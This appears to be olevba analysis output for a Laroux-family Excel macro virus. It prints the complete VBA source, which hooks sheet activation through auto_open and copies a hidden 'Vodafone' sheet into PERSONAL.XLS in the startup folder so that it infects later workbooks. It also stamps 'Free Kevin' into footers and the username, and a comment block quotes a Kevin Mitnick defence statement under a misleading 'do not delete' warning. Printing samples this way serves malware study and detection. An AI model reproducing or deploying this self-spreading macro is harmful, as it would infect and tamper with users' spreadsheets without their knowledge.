olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-a898b116a3c5c6478467e62a17462bcde5eff96c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Vodafone.bas 
in file: Virus.MSExcel.Laroux-based-a898b116a3c5c6478467e62a17462bcde5eff96c - OLE stream: '_VBA_PROJECT_CUR/VBA/Vodafone'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo Abort:
    Application.OnSheetActivate = "air_touch"
Abort:
End Sub

' DO NOT DELETE THIS FILE

' DELETING THIS FILE WILL CHANGE YOUR STARTUP

' THIS WAS NOT CREATED BY KEVIN MITNICK OR HIS ASSOCIATES



' THE UNITED STATES V. KEVIN DAVID MITNICK


'I. Proceedings to Date

'With 25 counts of alleged federal computer and wire fraud violations still pending against him,
'the criminal prosecution of Kevin Mitnick is approaching its most crucial hour. In reaching
'this point, however, Kevin has already experienced years of legal battles over alleged
'violations of the conditions of his supervised release and for possession of unauthorized
'cellular access codes.

'A. Settling the "Fugitive" Question

'The seemingly unexceptional charges relating to supervised release violations resulted in
'months of litigation when the government attempted to tack on additional allegations for
'conduct occurring nearly three years after the scheduled expiration of Kevin's term of
'supervised release in December, 1992. The government claimed that Kevin had become a fugitive
'prior to the expiration of his term, thereby "tolling" the term and allowing for the inclusion
'of additional charges. After months of increasingly bold assertions concerning Kevin's
'"fugitive" status, evidentiary hearings were held in which the government was forced to concede
'that its original position in this matter was unsupported by the facts.

'B.Sentencing

'In June of this year Kevin was sentenced for certain admitted violations of his supervised
'release and for possession of unauthorized access codes. The court imposed a sentence of 22
'months instead of the 32 months sought by the government. Since Kevin has been in custody
'since his arrest in February 1995, this sentence has been satisfied. We are currently preparing
'a request for release on bail.

'During this stage of the proceedings, the government sought to impose restrictions on Kevin's
'access to computers which were so severe as to virtually prohibit him from functioning
'altogether in today's society. The proposed restrictions sought to completely prohibit Kevin
'from "using or possessing" all computer hardware equipment, software programs, and wireless
'communications equipment. After arguments that such restrictions unduly burdened Kevin's
'freedom to associate with the on-line computer community and were not reasonably necessary to
'ensure the protection of the public, the court modified its restrictions by allowing for
'computer access with the consent of the Probation Office. Nonetheless, the defense believes
'that the severe restrictions imposed upon Mr. Mitnick are unwarranted in this case and is,
'therefore, pursuing an appeal to the Ninth Circuit.

'II. The Government Seeks to make an Example of Mr. Mitnick

'One of the strongest motivating factors for the government in the prosecution of Kevin Mitnick is a desire to send a message to other would-be "hackers". The government has hyped this prosecution by exaggerating the value of loss in the case, seeking unreasonably stiff sentences, and by painting a portrait of Kevin which conjures the likeness of a cyber-boogie man.

'There are a number of objectives prompting the government's tactics in this respect. First, by dramatically exaggerating the amount of loss at issue in the case (the government arbitrarily claims losses exceed some $80 million) the government can seek a longer sentence and create a high-profile image for the prosecution. Second, through a long sentence for Kevin, the government hopes to encourage more guilty pleas in future cases against other hackers. For example, a prosecutor offering a moderate sentence in exchange for a guilty plea would be able to use Kevin Mitnick's sentence as an example of what "could happen" if the accused decides to go to trial. Third, by striking fear into the hearts of the public over the dangers of computer hackers, the government hopes to divert scrutiny away from its own game-plan regarding the control and regulation of the Internet and other telecommunications systems.

'III. Crime of Curiosity

'The greatest injustice in the prosecution of Kevin Mitnick is revealed when one examines the
'actual harm to society (or lack thereof) which resulted from Kevin's actions. To the extent
'that Kevin is a "hacker" he must be considered a purist. The simple truth is that Kevin never
'sought monetary gain from his hacking, though it could have proven extremely profitable. Nor
'did he hack with the malicious intent to damage or destroy other people's property. Rather,
'Kevin pursued his hacking as a means of satisfying his intellectual curiosity and applying
'Yankee ingenuity. These attributes are more frequently promoted rather than punished by society.

'The ongoing case of Kevin Mitnick is gaining increased attention as the various issues and
'competing interests are played out in the arena of the courtroom. Exactly who Kevin Mitnick is
'and what he represents, however, is ultimately subject to personal interpretation and to the
'legacy which will be left by "The United States v. Kevin David Mitnick".


'______________________________
'Donald C.Randolph


Sub air_touch()
Attribute air_touch.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo Abort:
    
    With ActiveSheet.PageSetup
        .LeftFooter = ""
    End With
    With ActiveSheet.PageSetup
        .LeftFooter = "Free Kevin"
    End With
    With Application
        .UserName = "Free Kevin"
    End With
    C$ = Application.StartupPath
    m$ = Dir(C$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then
        p = 1
    Else
        p = 0
    End If
    If ActiveWorkbook.Modules.Count > 0 Then
        w = 1
    Else
        w = 0
    End If
    WhichFile = p + w * 10
    
    Select Case WhichFile
        Case 10
            Application.ScreenUpdating = False
            n4$ = ActiveWorkbook.Name
            Sheets("Vodafone").Visible = True
            Sheets("Vodafone").Select
            Sheets("Vodafone").Copy
            With ActiveWorkbook
                .Title = ""
                .Subject = ""
                .Author = ""
                .Keywords = ""
                .Comments = ""
            End With
            newname$ = ActiveWorkbook.Name
            c4$ = CurDir()
            ChDir Application.StartupPath
            ActiveWindow.Visible = False
            Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PERSONAL.XLS", _
                FileFormat:=xlNormal, _
                Password:="", _
                WriteResPassword:="", _
                ReadOnlyRecommended:=False, _
                CreateBackup:=False
            ChDir c4$
            Workbooks(n4$).Sheets("Vodafone").Visible = False
            Application.OnSheetActivate = ""
            Application.ScreenUpdating = True
            Application.OnSheetActivate = "personal.xls!air_touch"
        Case 1
            Application.ScreenUpdating = False
            n4$ = ActiveWorkbook.Name
            p4$ = ActiveWorkbook.Path
            s$ = Workbooks(n4$).Sheets(1).Name
            If s$ <> "Vodafone" Then
                Workbooks("PERSONAL.XLS").Sheets("Vodafone").Copy _
                    before:=Workbooks(n4$).Sheets(1)
                Workbooks(n4$).Sheets("Vodafone").Visible = False
            Else
            End If
            Application.OnSheetActivate = ""
            Application.ScreenUpdating = True
            Application.OnSheetActivate = "personal.xls!air_touch"
        Case Else
    End Select
    
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Laroux-based-a898b116a3c5c6478467e62a17462bcde5eff96c - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  Vodafon
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

